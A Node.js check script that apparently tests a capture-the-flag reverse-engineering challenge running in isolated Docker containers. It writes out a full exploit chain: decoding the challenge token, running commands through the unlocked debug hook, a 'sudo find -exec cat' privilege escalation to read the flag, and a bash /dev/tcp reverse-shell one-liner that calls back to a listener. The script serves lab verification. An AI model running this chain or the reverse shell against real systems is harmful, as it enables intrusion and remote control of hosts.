#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawnSync } = require('child_process');

const ROOT_DIR = path.resolve(__dirname, '..');
const PROJECT = process.env.COMPOSE_PROJECT_NAME || 'vulnerable_reverse_check';
const BASE_URL = process.env.REVERSE_SILVER_URL || 'http://127.0.0.1:4106';
const KEEP_COMPOSE = process.env.KEEP_COMPOSE === '1';
const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `reverse-silver-${stamp}`);
const commandLogPath = path.join(artifactDir, 'commands.log');

fs.mkdirSync(artifactDir, { recursive: true });

let commandIndex = 0;
const summary = {
  project: PROJECT,
  baseUrl: BASE_URL,
  proxyUrl: 'http://127.0.0.1',
  artifactDir,
  commands: [],
  debugHookUnlocked: false,
  directFlagReadDenied: false,
  privescFlagRead: false,
  realReverseShellConnected: false
};

function writeFile(name, data) {
  const filePath = path.join(artifactDir, name);
  fs.writeFileSync(filePath, data);
  return filePath;
}

function appendCommandLog(text) {
  fs.appendFileSync(commandLogPath, text);
}

function shellQuote(value) {
  if (/^[A-Za-z0-9_./:=@%+-]+$/.test(value)) return value;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function run(label, command, args, options = {}) {
  commandIndex += 1;
  const id = String(commandIndex).padStart(2, '0');
  const commandLine = [command, ...args].map(shellQuote).join(' ');
  appendCommandLog(`\n[${id}] $ ${commandLine}\n`);

  const result = spawnSync(command, args, {
    cwd: ROOT_DIR,
    env: {
      ...process.env,
      COMPOSE_PROJECT_NAME: PROJECT
    },
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });

  const stdoutPath = writeFile(`${id}-${label}.stdout.txt`, result.stdout || '');
  const stderrPath = writeFile(`${id}-${label}.stderr.txt`, result.stderr || '');
  const status = result.status === null ? 'signal' : result.status;
  appendCommandLog(`[${id}] exit=${status} stdout=${path.relative(ROOT_DIR, stdoutPath)} stderr=${path.relative(ROOT_DIR, stderrPath)}\n`);

  summary.commands.push({
    id,
    label,
    command: commandLine,
    status,
    stdout: path.relative(ROOT_DIR, stdoutPath),
    stderr: path.relative(ROOT_DIR, stderrPath)
  });

  if (result.error && !options.allowFailure) {
    throw result.error;
  }
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${label} failed with exit ${result.status}; see ${stdoutPath} and ${stderrPath}`);
  }
  return result.stdout || '';
}

function compose(args, options) {
  return run(options?.label || `compose-${args[0]}`, 'docker', ['compose', '-p', PROJECT, '-f', 'docker-compose.yml', ...args], options);
}

function curl(label, url, options = {}) {
  return run(label, 'curl', ['-fsS', '--retry', '30', '--retry-delay', '1', '--retry-all-errors', '--retry-connrefused', url], options);
}

function webGet(label, pathName, options = {}) {
  const url = `http://127.0.0.1${pathName}`;
  const script = [
    'set -eu',
    'for i in $(seq 1 30); do',
    `  if wget -qO- ${shellQuote(url)}; then exit 0; fi`,
    '  sleep 1',
    'done',
    `echo ${shellQuote(`web proxy GET failed: ${url}`)} >&2`,
    'exit 1'
  ].join('\n');
  return compose(['exec', '-T', 'web', 'sh', '-lc', script], {
    label,
    timeoutMs: options.timeoutMs || 120_000
  });
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function reverseSilverKey(index) {
  return ((index * 29) ^ 0xa7 ^ ((index + 3) * 11)) & 0xff;
}

function solveArtifact(source) {
  const payloadMatch = source.match(/const __payload = "([0-9a-f]+)"/i);
  const orderMatch = source.match(/const __order = \[([0-9,\s]+)\]/);
  if (!payloadMatch || !orderMatch) {
    throw new Error('artifact did not expose the expected encoded payload and order table');
  }

  const encoded = payloadMatch[1].match(/../g).map((byte) => Number.parseInt(byte, 16));
  const order = orderMatch[1].split(',').map((value) => Number.parseInt(value.trim(), 10));
  if (encoded.length !== order.length) {
    throw new Error(`artifact length mismatch: encoded=${encoded.length} order=${order.length}`);
  }

  const recovered = new Array(order.length);
  encoded.forEach((byte, position) => {
    const sourceIndex = order[position];
    recovered[sourceIndex] = ror8(byte, (sourceIndex % 5) + 1) ^ reverseSilverKey(sourceIndex);
  });
  return Buffer.from(recovered).toString('utf8');
}

function assertIncludes(text, needle, label) {
  if (!text.includes(needle)) {
    throw new Error(`${label} did not include ${needle}`);
  }
}

function assertUnlockResponse(text) {
  const parsed = JSON.parse(text);
  if (parsed.success !== true || parsed.unlocked !== 'debug-hook') {
    throw new Error(`unexpected unlock response: ${text}`);
  }
  assertIncludes(parsed.message || '', '/reverse/silver/debug', 'unlock response message');
  if ('flag' in parsed) {
    throw new Error('unlock response must not return the flag over HTTP');
  }
  return parsed;
}

function expectedFlagFromCompose() {
  const compose = fs.readFileSync(path.join(ROOT_DIR, 'docker-compose.yml'), 'utf8');
  const match = compose.match(/CHALLENGE_MODE=\/reverse\/silver\n\s*- FLAG=([^\n]+)/);
  if (!match) {
    throw new Error('could not find reverse-silver FLAG in docker-compose.yml');
  }
  return match[1].trim();
}

function curlWithStatus(label, args, options = {}) {
  const stdout = run(label, 'curl', ['-s', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args], {
    ...options,
    allowFailure: true
  });
  const marker = '\n__HTTP_STATUS__:';
  const idx = stdout.lastIndexOf(marker);
  if (idx === -1) {
    throw new Error(`${label}: missing status marker in curl output: ${stdout}`);
  }
  return {
    body: stdout.slice(0, idx),
    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
  };
}

function debugHook(label, { token, cmd, timeoutMs } = {}) {
  const args = ['-X', 'POST', `${BASE_URL}/reverse/silver/debug`, '-H', 'Content-Type: application/json'];
  if (token !== undefined) {
    args.push('-H', `X-Debug-Token: ${token}`);
  }
  args.push('-d', JSON.stringify(cmd === undefined ? {} : { cmd }));
  return curlWithStatus(label, args, { timeoutMs: timeoutMs || 30_000 });
}

// Fires a backgrounded, disowned reverse-shell one-liner through the debug
// hook and waits for it to call back on a throwaway local TCP listener. This
// proves the exploit chain can open a real interactive-style shell out of the
// container, not just execute one-shot commands over the HTTP debug channel.
function popRealReverseShell(token) {
  return new Promise((resolve, reject) => {
    const marker = `RSHELL_OK_${Date.now()}`;
    let settled = false;
    const server = net.createServer();

    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => finish(new Error('reverse shell did not call back within timeout')), 30_000);

    server.on('error', (err) => finish(err));
    server.on('connection', (socket) => {
      let buffer = '';
      let matched = false;
      socket.on('error', () => {}); // the remote shell may reset the connection after we close it; ignore
      socket.on('data', (chunk) => {
        if (matched) return;
        buffer += chunk.toString('utf8');
        if (buffer.includes(marker)) {
          matched = true;
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`echo ${marker}\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      const { port } = server.address();
      const payload = `setsid bash -c 'exec bash -i >& /dev/tcp/host.docker.internal/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown; echo triggered`;
      let trigger;
      try {
        trigger = debugHook('debug-trigger-reverse-shell', { token, cmd: payload, timeoutMs: 15_000 });
      } catch (err) {
        finish(err);
        return;
      }
      if (trigger.status !== 200) {
        finish(new Error(`reverse shell trigger failed: status=${trigger.status} body=${trigger.body}`));
      }
    });
  });
}

async function main() {
  appendCommandLog(`reverse-silver check started ${new Date().toISOString()}\n`);
  appendCommandLog(`logs: ${artifactDir}\n`);

  run('verify-isolated-compose', 'node', ['scripts/verify-isolated-compose.js']);
  compose(['down', '-v', '--remove-orphans'], { label: 'compose-preclean', allowFailure: true, timeoutMs: 120_000 });
  compose(['up', '-d', '--build', 'web', 'reverse-silver'], { label: 'compose-up-web-reverse-silver', timeoutMs: 240_000 });
  compose(['ps'], { label: 'compose-ps-after-up' });

  const page = curl('curl-reverse-page', `${BASE_URL}/reverse/silver`, { timeoutMs: 120_000 });
  writeFile('reverse-page.html', page);
  assertIncludes(page, '/reverse/silver/artifact.js', 'reverse challenge page');
  assertIncludes(page, '/reverse/silver/hints', 'reverse challenge page');

  const hints = curl('curl-hints', `${BASE_URL}/reverse/silver/hints`);
  writeFile('hints.json', hints);
  const parsedHints = JSON.parse(hints);
  if (!Array.isArray(parsedHints.hints) || parsedHints.hints.length < 5) {
    throw new Error('hints endpoint did not provide enough solving guidance');
  }

  const artifact = curl('curl-artifact', `${BASE_URL}/reverse/silver/artifact.js`);
  writeFile('artifact.js', artifact);
  const token = solveArtifact(artifact);
  if (artifact.includes(token)) {
    throw new Error('artifact leaked the recovered token in plaintext');
  }

  const bad = curl('curl-bad-token', `${BASE_URL}/reverse/silver?payload=hardcoded_in_binary`);
  writeFile('bad-token.html', bad);
  assertIncludes(bad, 'Token rejected', 'bad token response');

  const solveUrl = `${BASE_URL}/reverse/silver?payload=${encodeURIComponent(token)}`;
  const solved = curl('curl-solved-token', solveUrl);
  writeFile('solved.json', solved);
  assertUnlockResponse(solved);
  summary.recoveredToken = token;
  summary.debugHookUnlocked = true;

  const debugNoToken = debugHook('debug-no-token', { cmd: 'id' });
  writeFile('debug-no-token.json', debugNoToken.body);
  if (debugNoToken.status !== 403) {
    throw new Error(`debug hook without a token expected 403, got ${debugNoToken.status}`);
  }

  const debugWrongToken = debugHook('debug-wrong-token', { token: 'not-the-real-token', cmd: 'id' });
  writeFile('debug-wrong-token.json', debugWrongToken.body);
  if (debugWrongToken.status !== 403) {
    throw new Error(`debug hook with a wrong token expected 403, got ${debugWrongToken.status}`);
  }

  const debugNoCmd = debugHook('debug-no-cmd', { token });
  writeFile('debug-no-cmd.json', debugNoCmd.body);
  if (debugNoCmd.status !== 400) {
    throw new Error(`debug hook without cmd expected 400, got ${debugNoCmd.status}`);
  }

  const debugWhoami = debugHook('debug-whoami', { token, cmd: 'whoami' });
  writeFile('debug-whoami.json', debugWhoami.body);
  const whoamiJson = JSON.parse(debugWhoami.body);
  assertIncludes(whoamiJson.stdout || '', 'ctfuser', 'debug hook whoami stdout');

  const flagPath = '/tmp/rndsecurity-isolated/reverse-silver/flag.txt';
  const debugDirectRead = debugHook('debug-direct-flag-read-denied', { token, cmd: `cat ${flagPath}` });
  writeFile('debug-direct-flag-read.json', debugDirectRead.body);
  const directReadJson = JSON.parse(debugDirectRead.body);
  if (directReadJson.exitCode === 0) {
    throw new Error('ctfuser could read the locked flag directly over the debug hook; lock failed');
  }
  assertIncludes(`${directReadJson.stderr || ''}`, 'Permission denied', 'direct flag read stderr');
  summary.directFlagReadDenied = true;

  const privescCmd = `sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`;
  const debugPrivesc = debugHook('debug-privesc-flag-read', { token, cmd: privescCmd });
  writeFile('debug-privesc-flag-read.json', debugPrivesc.body);
  const privescJson = JSON.parse(debugPrivesc.body);
  if (privescJson.exitCode !== 0) {
    throw new Error(`sudo/find privesc flag read failed: ${debugPrivesc.body}`);
  }
  const flag = (privescJson.stdout || '').trim();
  const expectedFlag = expectedFlagFromCompose();
  if (flag !== expectedFlag) {
    throw new Error(`privesc-read flag mismatch: got=${flag} expected=${expectedFlag}`);
  }
  summary.flag = flag;
  summary.privescFlagRead = true;

  const reverseShellTranscript = await popRealReverseShell(token);
  writeFile('real-reverse-shell-transcript.txt', reverseShellTranscript);
  summary.realReverseShellConnected = true;

  const consoleState = curl('curl-console-state', `${BASE_URL}/__console/state`);
  writeFile('console-state.json', consoleState);
  assertIncludes(consoleState, '/reverse/silver/artifact.js', 'console state');
  assertIncludes(consoleState, '/reverse/silver?payload=', 'console state');

  const proxyHealth = webGet('web-proxy-healthz', '/healthz');
  writeFile('web-proxy-healthz.txt', proxyHealth);
  assertIncludes(proxyHealth, 'ok', 'web proxy health');

  const proxyPage = webGet('web-proxy-reverse-page', '/reverse/silver');
  writeFile('web-proxy-reverse-page.html', proxyPage);
  assertIncludes(proxyPage, '/reverse/silver/artifact.js', 'web proxy reverse page');

  const proxyArtifact = webGet('web-proxy-artifact', '/reverse/silver/artifact.js');
  writeFile('web-proxy-artifact.js', proxyArtifact);
  if (solveArtifact(proxyArtifact) !== token) {
    throw new Error('web proxy artifact did not solve to the same token as the direct service');
  }

  const proxySolvedUrl = `http://127.0.0.1/reverse/silver?payload=${encodeURIComponent(token)}`;
  const proxySolved = compose(['exec', '-T', 'web', 'sh', '-lc', `wget -qO- ${shellQuote(proxySolvedUrl)}`], {
    label: 'web-proxy-solved-token',
    timeoutMs: 60_000
  });
  writeFile('web-proxy-solved.json', proxySolved);
  assertUnlockResponse(proxySolved);
  summary.proxyDebugHookUnlocked = true;

  const finalConsoleState = curl('curl-console-state-final', `${BASE_URL}/__console/state`);
  writeFile('console-state-final.json', finalConsoleState);
  assertIncludes(finalConsoleState, '[reverse-silver] solved token accepted', 'final console state');
  assertIncludes(finalConsoleState, 'Wget', 'final console state');

  compose(
    [
      'exec',
      '-T',
      'reverse-silver',
      'sh',
      '-lc',
      `ls -la ${flagPath} && ! cat ${flagPath} && sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`
    ],
    { label: 'compose-exec-flag-artifact' }
  );

  console.log(`PASS reverse-silver compose check`);
  console.log(`Recovered token: ${token}`);
  console.log(`Flag: ${flag}`);
  console.log(`Artifacts: ${artifactDir}`);
}

let failure = null;
main()
  .catch((error) => {
    failure = error;
    summary.error = error instanceof Error ? error.message : String(error);
    console.error(summary.error);
    process.exitCode = 1;
  })
  .then(() => {
    compose(['logs', '--no-color', 'web', 'reverse-silver', 'postgres', 'seed-reverse-silver'], {
      label: 'compose-logs',
      allowFailure: true,
      timeoutMs: 120_000
    });
    if (!KEEP_COMPOSE) {
      compose(['down', '-v', '--remove-orphans'], {
        label: 'compose-down',
        allowFailure: true,
        timeoutMs: 120_000
      });
    }
    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
    if (failure) {
      process.exitCode = 1;
    }
  });
